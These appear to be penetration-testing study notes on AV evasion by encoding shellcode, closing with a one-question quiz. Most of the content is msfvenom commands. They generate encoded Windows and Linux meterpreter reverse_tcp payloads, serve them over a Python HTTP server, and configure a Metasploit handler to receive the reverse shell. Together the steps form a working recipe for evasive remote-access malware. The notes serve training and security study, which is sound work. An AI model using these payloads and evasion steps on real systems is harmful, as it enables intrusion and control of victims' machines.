
- Modifying the payload shell code to modify the payload signature.
- Used to evade AV detection.
- Most AV solutions are signature based. 

#### Shellcode 
- Piece of code used for exploitation
- The name comes from giving the user control via the command line

List Encoders
```
msfvenom --list encoders
```

Generate Windows Payload and encode it
All payloads for windows are for 32 bit by default unless stated other wise
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<local_host> LPORT=1234 -i 10 -e <encoder_name> -f exe > <dir_&_payload_name>
```

Generate Linux payload
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<local_host> LPORT<local_port> -i 10 -e  <encoder_name> -f elf  > <dir_&_payload_name>
```

Host exploit on web server with python
```
sudo python -m SimpleHTTPServer 80
```

Create handler
```
exploit/multi/handler
set payload /windows/meterpreter/
set LHOST <local_host>
set LPORT <local_port>
exploit
```

## Quiz

Which of the following Msfvenom options can be used to increase the number of encoding iterations? (Choose two)

```
-i 10
```

